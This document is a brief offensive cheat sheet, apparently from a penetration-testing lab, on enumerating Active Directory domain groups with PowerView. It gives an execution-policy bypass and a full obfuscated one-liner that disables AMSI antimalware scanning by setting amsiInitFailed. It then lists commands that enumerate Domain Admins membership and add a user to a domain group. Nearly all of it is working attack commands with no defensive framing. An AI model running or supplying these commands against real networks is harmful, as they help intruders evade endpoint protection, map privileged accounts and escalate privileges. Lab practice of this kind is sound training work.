# Domain Group Enumeration

Bypass the execution policy and AMSI protection

`powershell -ep bypass`

Bypass AMSI with this PowerShell command.

```
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

Import the PowerView script

`. .\powerview.ps1`

Get domain groups and members

`Get-DomainGroup`

`Get-DomainGroup -Name "Domain Admins"`

`Get-DomainGroupMember -Name "Domain Admins"`

`Get-DomainGroupMember -Name "Domain Admins" -Recurse`

`Get-DomainGroup -Username "talsonadmin"`

`Get-Domain`

`Get-DomainGroup -Domain domain.local`

Adding a user to a domain group

`Add-DomainGroupMember -Identity 'GROUP1' -Member 'student1' -Domain 'marvel'`

Check the users current state

`net user student1 /domain`

 
